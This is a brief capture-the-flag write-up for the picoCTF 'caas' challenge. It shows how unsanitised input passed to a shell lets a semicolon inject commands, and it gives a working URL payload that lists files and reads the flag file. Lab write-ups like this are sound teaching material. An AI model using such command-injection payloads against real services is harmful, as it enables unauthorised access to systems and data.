# caas

## Description
This write up will show how to solve the CTF for "caas"

## Solution
With cowsay, you can include a message between `{}`.</br>
The source code is not cleaning the input according to `index.js`.</br>
It is using an execute function, which might be bash.</br>
To separate functions withing bash, add a `;` and give a new command to execute next.</br>
Adding `;ls` after the the message, f.e. `/cowsay/{test};ls`, will show the following list:</br>
```
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
Now we can use the `cat` command to read the falg.txt file, assuming this will be the flag:</br>
`https://caas.mars.picoctf.net/cowsay/%7Btest%7D;cat%20falg.txt`</br>
This will give the flag indeed.
